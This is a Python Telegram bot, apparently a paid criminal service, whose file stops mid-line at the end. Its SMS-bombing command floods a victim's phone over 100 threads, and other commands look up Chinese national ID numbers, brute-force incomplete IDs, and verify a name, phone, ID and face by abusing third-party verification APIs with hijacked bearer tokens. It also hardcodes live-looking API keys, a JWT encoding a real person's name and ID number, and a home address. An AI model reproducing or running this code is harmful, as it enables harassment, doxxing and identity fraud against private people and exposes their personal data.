import telebot
import requests
import time
import re
import threading
import json
import os
import itertools
import binascii
import random
import concurrent.futures
import inspect  
import urllib.parse
import sms_list 
import sms_list_new
from sms_list import *
from Crypto.Cipher import DES3
from datetime import datetime
from telebot import types
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO
import base64
from PIL import Image
import traceback

# 屏蔽 SSL 证书报警
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ================= 1. 核心配置 =================
API_TOKEN = '8338893180:AAH-l_4m1-tweKyt92bliyk4fsPqoPQWzpU'
ADMIN_ID = 6649617045 
ADMIN_USERNAME = "@aaSm68"
POINTS_FILE = 'points.json'

# 三要素接口授权 Token
THREE_ELEMENTS_AUTH = "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpblR5cGUiOiJsb2dpbiIsImxvZ2luSWQiOiJhcHBfdXNlcjoxMTc1NDYwIiwicm5TdHIiOiJJSmVrU005UTlHc2hTV2RiVENQZ1VFbnpDN0MwWjFYZCJ9.vxjF6ShG81TM2hT-uiYyubHGOlEuCKC-m8nSmi7sayU"
# 二要素接口授权 Token
AUTH_BEARER = "bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IisxOTM3ODg4NDgyNiIsIm9wZW5JZCI6Im95NW8tNHk3Wnd0WGlOaTVHQ3V3YzVVNDZJYk0iLCJpZENhcmRObyI6IjM3MDQ4MTE5ODgwODIwMzUxNCIsInVzZXJOYW1lIjoi6ams5rCR5by6IiwibG9naW5UaW1lIjoxNzY5NDE1NjYxMTk0LCJhcHBJZCI6Ind4ZjVmZDAyZDEwZGJiMjFkMiIsImlzcmVhbG5hbWUiOnRydWUsInNhYXNVc2VySWQiOm51bGwsImNvbXBhbnlJZCI6bnVsbCwiY29tcGFueVZPUyI6bnVsbH0.GwMYvckFHvFbhSi0NXpQDPiv9ZswUBAImN5bUipBla0"

# 人脸核验配置
FACE_AUTH_TOKEN = "Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjA5YjViMDQ2LWI1NzYtNGJlNi05MGVhLTllY2YxNGNiMjI4MiJ9.fIUe4cTbOnK-l68a8cF44glMCd32sWxphcftKah6d9PK4PAo7vV9AdJOByZMt_X8YouKC6cb0_R_IUOgUBNMFg"
IMGLOC_API_KEY = "chv_e0sb_e58e156ce7f7c1d4439b550210c718de0c7af8820db77c0cd04e198ed06011b2e32ed1b5a7f1b00e543c76c20f5c64866bb355fde1dca14d6d74f0a1989b567d"
IMGLOC_URL = "https://imgloc.com/api/1/upload"

print("=" * 50)
print("机器人启动中...")
print("=" * 50)

bot = telebot.TeleBot(API_TOKEN)
# 清除可能的webhook
print("清除webhook...")
bot.remove_webhook()
time.sleep(1)
print("webhook已清除")

user_points = {}
user_states = {}
generated_cache = {} 

# --- 数据持久化 ---
def load_data():
    pts = {}
    if os.path.exists(POINTS_FILE):
        try:
            with open(POINTS_FILE, 'r') as f:
                data = json.load(f)
                pts = {int(k): float(v) for k, v in data.items()}
            print(f"加载积分数据: {len(pts)} 个用户")
        except Exception as e:
            print(f"加载积分数据失败: {e}")
    return pts

user_points = load_data()

def save_points():
    try:
        with open(POINTS_FILE, 'w') as f:
            json.dump({str(k): v for k, v in user_points.items()}, f)
    except Exception as e:
        print(f"保存积分失败: {e}")

# ================= 人脸核验功能 =================

def upload_to_imgloc(image_bytes):
    """上传到 imgloc 图床"""
    try:
        print("开始上传到 imgloc...")
        files = {'source': ('photo.jpg', image_bytes, 'image/jpeg')}
        data = {
            'key': IMGLOC_API_KEY,
            'format': 'json'
        }
        
        response = requests.post(IMGLOC_URL, files=files, data=data, timeout=30)
        print(f"imgloc 状态码: {response.status_code}")
        
        if response.status_code == 200:
            result = response.json()
            if result.get('status_code') == 200:
                url = result['image']['url']
                print(f"上传成功: {url}")
                return url
        return None
    except Exception as e:
        print(f"imgloc上传失败: {e}")
        return None

def image_to_base64(image_bytes):
    """图片转Base64"""
    try:
        print("开始转换图片到Base64...")
        print(f"原始图片大小: {len(image_bytes)} 字节")
        
        # 压缩图片
        img = Image.open(BytesIO(image_bytes))
        print(f"图片尺寸: {img.size}, 格式: {img.format}")
        
        img.thumbnail((1024, 1024))
        print(f"压缩后尺寸: {img.size}")
        
        output = BytesIO()
        img.save(output, format='JPEG', quality=85)
        compressed_bytes = output.getvalue()
        print(f"压缩后大小: {len(compressed_bytes)} 字节")
        
        base64_str = base64.b64encode(compressed_bytes).decode('utf-8')
        print("Base64转换完成")
        return f"data:image/jpeg;base64,{base64_str}"
    except Exception as e:
        print(f"Base64转换失败: {e}")
        traceback.print_exc()
        return None

def verify_face(name, id_card, image_bytes):
    """执行人脸核验"""
    print(f"\n开始人脸核验 - 姓名: {name}, 身份证: {id_card}")
    
    # 先尝试 imgloc 上传
    image_url = upload_to_imgloc(image_bytes)
    
    # 如果失败，用 Base64
    if not image_url:
        print("imgloc上传失败，尝试Base64")
        image_url = image_to_base64(image_bytes)
    
    if not image_url:
        print("图片处理失败")
        return {"success": False, "msg": "人脸核验不一致🔴"}
    
    print(f"图片URL已准备: {image_url[:50]}...")
    
    # 核验接口
    url = "https://www.cjhyzx.com/api/vx/actual/carrier/center/realPersonAuthentication"
    
    headers = {
        "Authorization": FACE_AUTH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X)"
    }
    
    payload = {
        "carrierUser": {
            "identityCard": id_card,
            "nickName": name,
            "address": "江苏省扬州市邗江区杨庙镇双庙村任巷组31号",
            "identityvalidPeriodTo": "2036-08-26"
        },
        "sysAttachmentInfoList": [{"fileUrl": image_url}]
    }
    
    print("发送核验请求...")
    try:
        response = requests.post(url, headers=headers, json=payload, timeout=30)
        print(f"核验响应状态码: {response.status_code}")
        print(f"核验响应内容: {response.text[:200]}")
        
        try:
            result = response.json()
        except:
            print("响应不是JSON格式")
            return {"success": False, "msg": "人脸核验不一致🔴"}
        
        if str(result.get("code")) in ["200", 200]:
            return {"success": True, "msg": "人脸核验一致🟢"}
        else:
            return {"success": False, "msg": "人脸核验不一致🔴"}
            
    except Exception as e:
        print(f"核验请求异常: {e}")
        traceback.print_exc()
        return {"success": False, "msg": "人脸核验不一致🔴"}

# ================= 人脸核验处理函数 =================

def handle_face_photo(message):
    """处理人脸核验的照片"""
    print("\n" + "=" * 50)
    print("进入 handle_face_photo 函数")
    print(f"消息ID: {message.message_id}")
    print(f"用户ID: {message.from_user.id}")
    print(f"聊天ID: {message.chat.id}")
    print("=" * 50)
    
    uid = message.from_user.id
    chat_id = message.chat.id
    
    # 检查状态
    if chat_id not in user_states:
        print(f"状态不存在: {chat_id}")
        bot.reply_to(message, "❌ 请先发送 /rlhy 开始人脸核验")
        return
    
    state = user_states[chat_id]
    print(f"当前状态: {state}")
    
    if state.get('step') != 'waiting_face_photo':
        print(f"状态错误: {state.get('step')}")
        bot.reply_to(message, "❌ 请先发送 /rlhy 开始人脸核验")
        return
    
    # 扣除积分
    if user_points.get(uid, 0.0) < 0.1:
        print(f"积分不足: {user_points.get(uid, 0.0)}")
        bot.send_message(chat_id, "❌ 积分不足，需要 0.1 积分")
        del user_states[chat_id]
        return
    
    # 发送处理中提示
    bot.send_message(chat_id, "⏳ 正在核验，请稍候...")
    
    try:
        # 获取照片
        photos = message.photo
        print(f"收到照片数量: {len(photos)}")
        
        photo = photos[-1]  # 使用最大尺寸
        file_id = photo.file_id
        print(f"文件ID: {file_id}")
        
        # 下载照片
        print("正在下载照片...")
        file_info = bot.get_file(file_id)
        print(f"文件信息: {file_info}")
        
        downloaded_file = bot.download_file(file_info.file_path)
        print(f"下载完成，文件大小: {len(downloaded_file)} 字节")
        
        # 执行核验
        print("开始执行人脸核验...")
        result = verify_face(state['name'], state['id_card'], downloaded_file)
        print(f"核验结果: {result}")
        
        # 扣除积分
        user_points[uid] -= 0.1
        save_points()
        print(f"积分扣除成功，当前余额: {user_points[uid]:.2f}")
        
        # 发送结果
        if result["success"]:
            bot.send_message(
                chat_id,
                f"✅ 核验成功!\n\n"
                f"姓名: {state['name']}\n"
                f"身份证: {state['id_card']}\n"
                f"结果:{result['msg']}\n\n"
                f"已扣除 0.1 积分\n"
                f"当前余额: {user_points[uid]:.2f} 积分"
            )
        else:
            bot.send_message(
                chat_id,
                f"❌ 核验失败!\n\n"
                f"姓名: {state['name']}\n"
                f"身份证: {state['id_card']}\n"
                f"结果:{result['msg']}\n\n"
                f"已扣除 0.1 积分\n"
                f"当前余额: {user_points[uid]:.2f} 积分"
            )
        
    except Exception as e:
        print(f"❌ 处理照片出错: {str(e)}")
        traceback.print_exc()
        bot.send_message(chat_id, f"❌ 处理失败: {str(e)}")
    finally:
        # 清除状态
        if chat_id in user_states:
            del user_states[chat_id]
            print("状态已清除")

# ================= 原有功能逻辑 =================

def xiaowunb_query_logic(chat_id, id_number, uid):
    base_url = "http://xiaowunb.top/cyh.php"
    params = {"sfz": id_number}
    try:
        response = requests.get(base_url, params=params, timeout=10)
        response.encoding = 'utf-8'
        user_points[uid] -= 1.5
        save_points()
        res_text = response.text if response.text.strip() else "查询结果为空"
        result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **1.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
        bot.send_message(chat_id, result_message, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {e}")

def query_3ys_logic(chat_id, name, id_card, phone, uid):
    url = "https://esb.wbszkj.cn/prod-api/wxminiapp/user/userIdVerify"
    headers = {
        "Host": "esb.wbszkj.cn",
        "Authorization": THREE_ELEMENTS_AUTH,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.68(0x18004433) NetType/WIFI Language/zh_CN",
        "Referer": "https://servicewechat.com/wx9a9be9dbdb704208/18/page-frame.html"
    }
    data = {
        "name": name, "phone": phone, "idNo": id_card, "idType": 1,
        "idFrontFile": "https://guarantee-file.wbszkj.cn/gcb/prod/2026/02/10/8cc33d9e9328421ead4855120bc3d32e.jpg",
        "idBackFile": "https://guarantee-file.wbszkj.cn/gcb/prod/2026/02/10/40449082275741f0830d0c1ce7b9d4b8.jpg"
    }
    try:
        response = requests.post(url, headers=headers, json=data, timeout=10, verify=False)
        user_points[uid] -= 0.05
        save_points()
        if response.status_code == 200:
            result = response.json()
            res_type = "三要素核验一致✅" if result.get("success") else "三要素核验失败❌"
        else:
            res_type = "三要素核验失败❌ (服务响应错误)"
        
        message = (f"名字：{name}\n手机号：{phone}\n身份证：{id_card}\n结果：{res_type}\n\n"
                   f"已扣除 0.05 积分！\n当前积分余额：{user_points[uid]:.2f} 积分")
        bot.send_message(chat_id, message)
    except Exception as e:
        bot.send_message(chat_id, f"⚠️ 系统异常: {str(e)}")

def single_verify_2ys(chat_id, name, id_card, uid):
    url = "https://api.xhmxb.com/wxma/moblie/wx/v1/realAuthToken"
    headers = {
        "Authorization": AUTH_BEARER, "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0", "Referer": "https://servicewechat.com/wxf5fd02d10dbb21d2/59/page-frame.html"
    }
    try:
        r = requests.post(url, headers=headers, json={"name": name, "idCardNo": id_card}, timeout=10)
        user_points[uid] -= 0.01
        save_points()
        res_json = r.json()
        res_type = "二要素核验一致✅" if res_json.get("success") else f"二要素验证失败 ❌"
        res = (f"姓名: **{name}**\n身份证: **{id_card}**\n结果: **{res_type}**\n\n已扣除 **0.01** 积分！\n当前余额：**{user_points[uid]:.2f}**")
        bot.send_message(chat_id, res, parse_mode='Markdown')
    except Exception as e:
        bot.send_message(chat_id, f"❌ 接口请求失败: {str(e)}")

# ================= 3. UI/菜单函数 =================

def get_id_check_code(id17):
    factors = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]
    rem_map = {0: '1', 1: '0', 2: 'X', 3: '9', 4: '8', 5: '7', 6: '6', 7: '5', 8: '4', 9: '3', 10: '2'}
    try:
        sum_val = sum(int(id17[i]) * factors[i] for i in range(17))
        return rem_map[sum_val % 11]
    except: return "X"

def get_main_markup():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("使用帮助", callback_data="view_help"),
               types.InlineKeyboardButton("在线充值", callback_data="view_pay"))
    return markup

def get_pay_markup():
    admin_url = f"https://t.me/{ADMIN_USERNAME.replace('@', '')}"
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("USDT 充值", url=admin_url),
               types.InlineKeyboardButton("OkPay 充值", url=admin_url),
               types.InlineKeyboardButton("RMB 充值", url=admin_url),
               types.InlineKeyboardButton("🔙", callback_data="back_to_main"))
    return markup

def get_help_markup():
    return types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙", callback_data="back_to_main"))

def get_main_text(source, uid, pts):
    first_name = source.from_user.first_name if hasattr(source.from_user, 'first_name') else "User"
    username = f"@{source.from_user.username}" if hasattr(source.from_user, 'username') and source.from_user.username else "未设置"
    return (f"Admin@铭\n\n用户 ID: `{uid}`\n用户名称: `{first_name}`\n用户名: {username}\n当前余额: `{pts:.2f}积分`\n\n使用帮助可查看使用教程\n在线充值可支持24小时\n1 USDT = 1 积分")

# ================= 短信测压 =================

def get_all_senders():
    all_funcs = []
    excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
    for name, obj in inspect.getmembers(sms_list):
        if inspect.isfunction(obj) and name not in excludes:
            try:
                sig = inspect.signature(obj)
                if len(sig.parameters) >= 1: all_funcs.append(obj)
            except: pass
    if hasattr(sms_list_new, 'NEW_PLATFORMS'):
        for name, func in sms_list_new.NEW_PLATFORMS:
            if func not in all_funcs: all_funcs.append(func)
    return all_funcs

@bot.message_handler(commands=['sms'])
def sms_bomb_cmd(message):
    uid = message.from_user.id
    if user_points.get(uid, 0.0) < 3.5: return bot.reply_to(message, "积分不足(3.5)")
    parts = message.text.split()
    if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
    target = parts[1]
    if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
    all_funcs = get_all_senders()
    bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
    user_points[uid] -= 3.5; save_points()
    def do_bomb():
        random.shuffle(all_funcs)
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            for func in all_funcs: executor.submit(func, target)
        bot.send_message(message.chat.id, f"✅ 目标 `{target}` 任务执行完毕")
    threading.Thread(target=do_bomb).start()

# ================= 指令入口 =================

@bot.message_handler(commands=['cyh', '3ys', 'admin', 'add', 'start', 'bq', '2ys', 'rlhy'])
def handle_commands(message):
    uid, chat_id = message.from_user.id, message.chat.id
    cmd = message.text.split()[0][1:]
    
    print(f"收到指令: /{cmd} 来自用户 {uid}")
    
    # 权限检查：如果是管理员专用指令且用户不是管理员
    if cmd in ['add', 'admin'] and uid != ADMIN_ID:
        return bot.reply_to(message, "🤡你没有权限使用该指令…")

    if cmd == 'start':
        if uid not in user_points: user_points[uid] = 0.0
        bot.send_message(chat_id, get_main_text(message, uid, user_points[uid]), parse_mode='Markdown', reply_markup=get_main_markup())
    elif cmd == 'add' and uid == ADMIN_ID:
        try:
            p = message.text.split(); tid, amt = int(p[1]), float(p[2])
            user_points[tid] = user_points.get(tid, 0.0) + amt; save_points()
            bot.reply_to(message, f"✅ 已充值！当前余额: `{user_points[tid]:.2f}`")
        except: pass
    elif cmd == 'cyh':
        if user_points.get(uid, 0.0) < 1.5: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'cyh_id'}; bot.send_message(chat_id, "请输入要查询的身份证号：")
    elif cmd == '3ys':
        if user_points.get(uid, 0.0) < 0.05: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'v_3ys'}; bot.send_message(chat_id, "请输入姓名 手机号 身份证")
    elif cmd == 'bq':
        if user_points.get(uid, 0.0) < 0.1: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'g_card'}; bot.send_message(chat_id, "请输入身份证号（未知用x）：")
    elif cmd == '2ys':
        if user_points.get(uid, 0.0) < 0.01: return bot.reply_to(message, "积分不足，请先充值！")
        user_states[chat_id] = {'step': 'v_2ys'}; bot.send_message(chat_id, "请输入姓名 身份证")
    elif cmd == 'rlhy':
        if user_points.get(uid, 0.0) < 0.1: return bot.reply_to(message, "❌ 积分不足，需要 0.1 积分")
        user_states[chat_id] = {'step': 'rlhy_name'}; bot.send_message(chat_id, "📝 请输入姓名和身份证号\n例如：张三 110101199001011234")
        print(f"设置状态: {user_states[chat_id]}")

# ================= 消息处理 =================

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid, chat_id = message.from_user.id, message.chat.id
    
    # 打印所有消息类型
    print(f"\n收到消息 - 类型: {message.content_type}, 用户: {uid}, 聊天: {chat_id}")
    
    # 处理照片消息 - 放在最前面
    if message.content_type == 'photo':
        print(f"📸 收到照片，当前状态: {user_states.get(chat_id)}")
        
        # 检查是否在人脸核验状态
        if chat_id in user_states:
            state = user_states[chat_id]
            if state.get('step') == 'waiting_face_photo':
                print("✅ 状态匹配，开始处理人脸核验照片")
                handle_face_photo(message)
                return
        
        # 不在人脸核验状态
        print("❌ 不在人脸核验状态")
        bot.reply_to(message, "❌ 请先发送 /rlhy 开始人脸核验\n流程：\n1. 发送 /rlhy\n2. 输入：姓名 身份证号\n3. 发送照片")
        return
    
    # 处理文本消息
    text = message.text.strip() if message.text else ""
    
    # 忽略命令（已经在单独的handler处理）
    if text.startswith('/'):
        return
    
    print(f"处理文本: {text}")
    
    # --- 自动识别逻辑 ---
    if chat_id not in user_states or not user_states[chat_id].get('step'):
        parts = re.split(r'[,，\s\n]+', text.strip())
        # A. 自动识别三要素
        if len(parts) >= 3:
            n, p, i = None, None, None
            for x in parts:
                if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
                elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
                elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
            if n and p and i:
                if user_points.get(uid, 0.0) < 0.05: return bot.reply_to(message, "❌ 积分不足(0.05)")
                return query_3ys_logic(chat_id, n, i, p, uid)
        # B. 自动识别二要素
        if len(parts) == 2:
            n, i = None, None
            for x in parts:
                if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
                elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
            if n and i:
                if user_points.get(uid, 0.0) < 0.01: return bot.reply_to(message, "❌ 积分不足(0.01)")
                return single_verify_2ys(chat_id, n, i, uid)
        # C. 常用号
        if re.match(r'^\d{17}[\dXx]$|^\d{15}$', text):
            if user_points.get(uid, 0.0) < 1.5: return bot.reply_to(message, "❌ 积分不足(1.5)")
            return xiaowunb_query_logic(chat_id, text, uid)

    # --- 状态机逻辑 ---
    state = user_states.get(chat_id)
    if not state: 
        return
    step = state['step']
    
    print(f"当前步骤: {step}")
    
    if step == 'v_3ys':
        del user_states[chat_id]
        parts = re.split(r'[,，\s\n]+', text.strip())
        n, p, i = None, None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not p and re.match(r'^1[3-9]\d{9}$', x): p = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and p and i: 
            query_3ys_logic(chat_id, n, i, p, uid)
        else: 
            bot.reply_to(message, "格式错误，请确保包含姓名 手机号 身份证")

    elif step == 'cyh_id': 
        del user_states[chat_id]
        return xiaowunb_query_logic(chat_id, text, uid)
    
    elif step == 'v_2ys': 
        del user_states[chat_id]
        parts = re.split(r'[,，\s\n]+', text.strip())
        n, i = None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): n = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): i = x.upper()
        if n and i: 
            single_verify_2ys(chat_id, n, i, uid)
        else: 
            bot.reply_to(message, "格式错误，请发送姓名 身份证")
        
    elif step == 'g_card':
        user_states[chat_id].update({'step': 'g_sex', 'card': text.lower()})
        bot.send_message(chat_id, "请输入性别 (男/女):")
        
    elif step == 'g_sex':
        user_points[uid] -= 0.1
        save_points()
        base_17 = state['card'][:17]
        char_sets = [list(ch) if ch != 'x' else list("0123456789") for ch in base_17]
        if text == "男": 
            char_sets[16] = [c for c in char_sets[16] if int(c) % 2 != 0]
        else: 
            char_sets[16] = [c for c in char_sets[16] if int(c) % 2 == 0]
        ids = [s17 + get_id_check_code(s17) for s17 in ["".join(res) for res in itertools.product(*char_sets)]]
        with open("铭.txt", "w", encoding="utf-8") as f: 
            f.write("\n".join(ids))
        with open("铭.txt", "rb") as f: 
            bot.send_document(chat_id, f, caption=f"✅ 生成成功！消耗0.1积分")
        del user_states[chat_id]
        
    elif step == 'rlhy_name':
        # 解析姓名和身份证
        parts = re.split(r'[,，\s\n]+', text.strip())
        n, i = None, None
        for x in parts:
            if not n and re.match(r'^[\u4e00-\u9fa5]{2,4}$', x): 
                n = x
            elif not i and re.match(r'^[\dXx]{15}$|^[\dXx]{18}$', x): 
                i = x.upper()
        
        if n and i:
            user_states[chat_id] = {
                'step': 'waiting_face_photo',
                'name': n,
                'id_card': i
            }
            print(f"✅ 设置人脸核验状态成功: {user_states[chat_id]}")
            bot.send_message(chat_id, f"✅ 已收到信息\n\n姓名: {n}\n身份证: {i}\n\n📸 请发送本人照片")
        else:
            bot.send_message(chat_id, "❌ 格式错误\n请发送：姓名 身份证号\n例如：张三 110101199001011234")

# ================= 按钮点击事件 =================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    uid, pts = call.from_user.id, user_points.get(call.from_user.id, 0.0)
    if call.data == "view_help":
        help_text = (
            "🛠️️使用帮助\n"
            "短信测压\n"
            "发送 /sms 手机号\n"
            "每次消耗 3.5 积分\n"
            "——————————————————\n"
            "补齐身份证\n"
            "发送 /bq 进行操作\n"
            "每次补齐扣除 0.1 积分\n"
            "——————————————————\n"
            "名字-身份证核验（企业级）\n"
            "全天24h秒出 毫秒级响应\n"
            "发送 /2ys 进行核验\n"
            "每次核验扣除 0.01 积分\n"
            "——————————————————\n"
            "名字-手机号-身份证核验（企业级）\n"
            "全天24h秒出 毫秒级响应\n"
            "发送 /3ys 进行核验\n"
            "每次核验扣除 0.05 积分\n"
            "——————————————————\n"
            "常用号查询\n"
            "发送 /cyh 进行查询\n"
            "全天24h秒出 假1赔10000\n"
            "每次查询扣除 1.5 积分 空不扣除积分\n"
            "——————————————————\n"
            "人脸核验\n"
            "发送 /rlhy 进行操作\n"
            "每次核验扣除 0.1 积分"
        )
        bot.edit_message_text(help_text, call.message.chat.id, call.message.message_id, reply_markup=get_help_markup())
    elif call.data == "view_pay":
        bot.edit_message_text("🛍️ 请选择充值方式：\n1 USDT = 1 积分", call.message.chat.id, call.message.message_id, reply_markup=get_pay_markup())
    elif call.data == "back_to_main":
        bot.edit_message_text(get_main_text(call, uid, pts), call.message.chat.id, call.message.message_id, parse_mode='Markdown', reply_markup=get_main_markup())

if __name__ == '__main__':
    print("=" * 50)
    print("Bot 正在运行...")
    print("新增指令: /rlhy - 人脸核验 (0.1积分/次)")
    print("=" * 50)
    
    # 测试PIL是否
